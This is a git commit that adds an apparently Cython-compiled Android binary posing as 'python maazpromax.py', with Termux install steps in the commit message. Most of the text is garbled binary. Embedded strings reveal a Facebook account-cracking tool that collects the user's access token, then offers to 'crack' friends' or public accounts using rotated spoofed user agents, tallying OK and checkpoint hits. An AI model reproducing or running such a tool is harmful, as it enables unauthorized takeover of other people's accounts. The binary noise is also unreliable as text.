43cd76c880f4f3ecb674c7a8d625c42dfad0b742
maazkhanx <101729868+maazkhanx@users.noreply.github.com>
2022-03-16 20:28:09 +0500

    Create python maazpromax.py
    pkg install python2
    apt update && apt upgrade
    apt install python
    pip install lolcat
    pip install mechanize
    pip install requests bs4
    apt install git
    git clone https://github.com/maazkhanx/maazkhanx.git
    cd maazpromax
    python maazpromax.py

---
+++ python maazpromax.py
@@ -0,0 +1,207 @@
+ELF��s@H3@8
+
+@ @@@00�c�c�c�s�s�� | � ������������}ȝȝ��R�td | � ���P�tdPaPaPa||Q�tdppp���Androidr23b7779620Whz������� 5LXky������,Xi�������
+
+)6ETn��������1GUgt�������/H�;0�@H�G
+
+t:H�c
+
+E��E�qX��|BE�� V�JJ6?>I,C<=&!"$9;A:0*-
+
+2HG
+
+D1'#.4F3E %+)5(7/8	@B__cxa_atexit__cxa_finalize__register_atfork__bss_start_end_edataPyInit_fcpromaxPyModuleDef_InitPyThreadState_GetPyInterpreterState_GetIDPyExc_ImportErrorPyErr_SetStringPyObject_GetAttrStringPyModule_NewObject_Py_DeallocPyModule_GetDictPyDict_SetItemString_Py_NoneStructPyExc_AttributeErrorPyErr_ExceptionMatchesPyErr_ClearPyExc_RuntimeErrorPyOS_snprintfPy_GetVersionPyErr_WarnExPyTuple_NewPyBytes_FromStringAndSizePyUnicode_FromStringAndSizePyImport_AddModulePyObject_SetAttrStringPyUnicode_InternFromStringPyUnicode_DecodePyObject_Hash__pyx_module_is_main_fcpromaxPyObject_SetAttrPyImport_GetModuleDictPyDict_GetItemStringPyTuple_PackPyList_NewPyDict_NewPyImport_ImportModuleLevelObject_PyThreadState_UncheckedGet_PyObject_GetDictPtr_Py_FalseStruct_Py_TrueStructPyObject_NotPyErr_OccurredPyDict_SetItem_PyDict_GetItem_KnownHashPyObject_GetAttrPyUnicode_FromFormatPyUnicode_AsUTF8PyCode_NewEmptyPyFrame_NewPyTraceBack_HerePyMem_ReallocPyMem_Malloc__stack_chk_failPyExc_NameErrorPyErr_FormatPy_EnterRecursiveCallPy_LeaveRecursiveCallPyObject_CallPyExc_SystemErrorPyObject_DirPyDict_ContainsPyExc_TypeErrorPyEval_GetBuiltinsPyCode_TypePyUnicode_AsUTF8StringPyEval_MergeCompilerFlagsPyRun_StringFlagsPyEval_EvalCodelibc.soLIBC/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/lib:/data/data/com.termux/files/usr/liblibandroid-support.solibpython3.10.so.1.0 � �(��0��P��X��x�������p���aȜ�М&a�Ȳ��,a�в �5a@���H�=ah���p�Fa���s���sбO�P����t(�4wh�p�x�����'��(��6��;��>��@��I؟���������	� �(�0�
+
+8�@�H�P�X�`�h�p�x��������������� ��!��"Ƞ#Р$ؠ%�&�)�*��+�,�-�.�/ �0(�10�28�3@�4H�5P�7X�8`�9h�:p�<x�=��?��A��B��C��D
+
+parent%sexec: arg 1 must be string, bytes or code object, got %.200s while calling a Python objectnamefcpromax.pyfcpromaxModule 'fcpromax' has already been imported. Re-initialisation is not supported.%d.%d__file__submodule_search_locations__loader____package____path__code object passed to exec() may not contain free variables/data/data/com.termux/files/home/fcpromax.ccython_runtimecompiletime version %s of module '%.100s' does not match runtime version %sInterpreter change detected - this module can only be loaded into one interpreter per process.NULL result without error in PyObject_Callbuiltinsexec() arg 2 must be a dict, not %.200s%s (%s:%d)loaderorigininit fcpromaxname '%U' is not defined__builtins__cline_in_traceback�
+
+@��ddlZzddlZWneyed�e�d�YnwzddlZWney5ed�e�d�YnwzddlZWneyNed�e�d�YnwddlZddlZddlZddlZddl	Z	ddl
+
+Z
+
+ddlZddlZddl
+
+Z
+
+ddlZddlZddlZddlZddlmZdd	l
+
+m
+
+Z
+
+dd
+
+lmZe
+
+��ZejZgd�Zzedks�edkr�e�ed
+
+ZWney�e�Ynwe
+
+��ZejZejZ ej!Z"eeZ#dZ$dZ%dZ&dZ'dZ(dZ)dZ*dZ+dZ,e$e%e&e'e(e)e*e+gZ-e�.e-�Z/iiZ0Z1d\Z2a3Z4ggZ5Z6ga7ga3gZ8gZ9da:dZ;dZ<dZ=ddiZ>dddd d!d"d#d$d%d&d'd(d)�Z?d*Z@ze�Ad+�jBZCWnejDjE�y?ed,�e�Ynwd-d.�ZFgd/�ZGd0d1�ZHd2d3�ZId4d5�ZJd6d7�ZKd8d9�ZLd:d;�ZMd<d=�ZNGd>d?�d?�ZOd@dA�ZPeQdBk�ryeP�dSdS	�C�Nu)
+
+ [×] requests module not installed!...
+
+zpip install requestsu(
+
+ [×] Futures module not installed!...
+
+zpip install futuresu$
+
+ [×] Bs4 module not installed!...
+
+zpip install bs4)�ThreadPoolExecutor)�datetime)�
+
+BeautifulSoup)ZJANZFEBZMARZAPRZMAYZJUNZJULZAUGZSEPZOCTZNOVZDEC��z[1;97mz[1;91mz[1;92mz[1;93mz[1;94mz[1;95mz[1;96mz[0mz[1;30m)rrrzhttps://lookup-id.com/zhttps://m.facebook.comzhttps://www.httpbin.org/ip�
+
+user-agentz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]ZJanuaryZFebruaryZMarchZAprilZMayZJuneZJulyZAugustusZ	SeptemberZOctoberZNovemberZDecember)�01�02Z03Z04Z05Z06Z07Z08Z09Z10Z11Z12Fz(https://www.google.com/search?q=Maaz+khan
+
+NO INTERNET CONNECTION
+
+cCs2|dD]}tj�|�tj��t�d�qdS)N�
+
+g{�G�z�?)�sys�stdout�write�flush�time�sleep)�z�e�r�maazpromax.py�xoxTs
+
+
+
+�r)z�Mozilla/5.0 (Linux; Android 10; Redmi Note 7 Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]z�nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+ Opera/7.1z�Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z�Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z�Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z�Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z�Mozilla/5.0 (Linux; Android 11; SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/283.0.0.6.117;]z�Mozilla/5.0 (Windows NT 10.0; OPPSS :)64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]c	Cst�d�td�tdt�tdt�tdt�tdt�tdt�tdt�td	t�td
+
+t�tdt�tdt�td�td
+
+t�tdtttf�tdtttf�tdtttf�tdt�td�tdtttttttf�td�dS)N�clear�uW%s    ▄▄▄      ▒███████▒ █▄ ▄███▓u[%s   ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒uU%s   ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░uU%s   ░██▄▄█   ▄   ▒██ u]%s    ▓█   ▓██▒▒███▒░██▒uQ%s    ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░uE%s     ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░u=%s     ░   ▒   ░ ░ ░ ░ ░ ▒ ░░      ░   u3%s         ░  ░  ░ ░     ░         ░   u)%s             ░                       u�%s╔══════════════════════════════════════════╗u6%s║%s  Author   : Maazkhan                  %s║u6%s║%s  Github   : https://github.com/Azim-Vau  %s║u6%s║%s  Fb       : https://me.fb/Maaz Khanx     %s║u�%s╚══════════════════════════════════════════╝u4           %s》%s》%s》%sFCPRO MAX%s《%s《%s《)�os�system�print�M�B�Z�Hrrrr�logogs*
+
+r!cCstdttf�dS)Nu�%s═══════════════════════════════════════════%s
+
+ 
+
+)rr�Nrrrr�linex~sr#cCs^t|�dkst|�dkr"td�tdttt��tt|��f�dStdttf�t�dS)Nrz&[92;1m THE PROCESS HAS BEEN COMPLETEDz/[93;1m TOTAL [92;1mOK[93;1m/[91;1mCP: %s/%sz'
+
+ 
+
+ [%s!%s] NO RESULT YOUR BAD LOCK :(:()�lenr�str�okr �exit)ZOK�cprrr�hasil�s$r)cCst�d�t�tdt�td�tdttttf�}z$tdd��	|�t
+
+�d|���d}t
+
+d	t�t�d
+
+�t�WdStyZtdttf�t�d�t�YdStyttdtttf�t�d�t�YdSt
+
+jjy�td
+
+tttf�YdSw)Nrz  %s              LOGIN FACEBOOK rz
+
+ %s[%s?%s] PUT TOKEN : %s�
+
+.token.txt�a�-https://graph.facebook.com/me?access_token=%s�namez%s
+
+ 
+
+ LOGIN SUCCESSFUL...! ��
+
+ %s[%s×%s] INVALID TOKENr�
+
+ 
+
+ %s[%s!%s] NO CONNECTION
+
+)rrr!rr �input�K�P�openr�requests�get�jsonrrr�azim_vau�AttributeError�azim�UnboundLocalError�
+
+exceptions�ConnectionErrorr')�cookie�namarrrr:�s"
+
+&(�r:c
+
+	Cs�zt�d�WnYt�d�t�t�t���}|d}z	tdd��	�}Wnt
+
+yGtdttt
+
+f�t�d�t�d�t�Ynwzt�d	|���d
+
+��}Wn7ty{tdt
+
+t
+
+t
+
+f�t�d�t�d�t�d�t�Yntjjy�tdt
+
+t
+
+t
+
+f�Ynwztjd
+
+dddd�d���}|d}|d��}Wnty�d}Ynwtdt�tdt
+
+tt
+
+ttt
+
+|f�tdt
+
+tt
+
+ttt
+
+|f�tdt
+
+tt
+
+ttt
+
+|f�tdt
+
+tt
+
+ttt
+
+f�td�tdt
+
+tt
+
+t
+
+f�t�d�tdt
+
+tt
+
+tt
+
+f�t�d�tdt
+
+tt
+
+ttf�t�d�td t
+
+tt
+
+f�}|dk�r@td!t
+
+t
+
+t
+
+f�t�d�t�n�|d"v�r�z6td#�td$�}t|�}	t�d%|	�d&��d'|�����d(}
+
+|
+
+d)D]}t�|d*d+|d
+
+��qhW�q�t�y�td,t
+
+t
+
+t
+
+f�t�d-�t�Y�q�w|d.v�r�t |�nM|d/v�r�td�gd0�}|D]}t!j"�#d1ttt|f�t!j"�$�t�d2��q�t�d�td3tttt
+
+f�ntd4tttt|tf�t�d�t�t%��&t�S)5NZresultsr�originr*�rr/r.zrm -rf .token.txtr,r-zrm -rf .cokie.txtr0zhttp://ip-api.com/json/zhttp://ip-api.com/zapplication/json; charset=utf-8z�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;])ZRefererzContent-Typez
+
+User-Agent��headersZqueryZcountry� z%s u%s [%s•%s] %sNAME   %s: %s%su%s [%s•%s] %sIP     %s: %s%su%s [%s•%s] %sFROM   %s: %s%su$%s [%s•%s] %sSTATUS %s: %sTRIAL :)rz'%s [%s01%s] %sCRACK FROM FRIENDS/PUBLICg���Q��?z)%s [%s02%s] %sCRACK FROM PUBLIC %s(MULTI)z%s [%s00%s] %sLOGOUT %sz
+
+ %s[%s>_%s] MENU : u
+
+ %s[%s×%s] DON'T EMPTY... !)�1r
+
+z
+
+ [0] INPUT IDz [*] ENTER PUBLIC ID: �https://graph.facebook.com/�_puck_�-?fields=friends.fiel
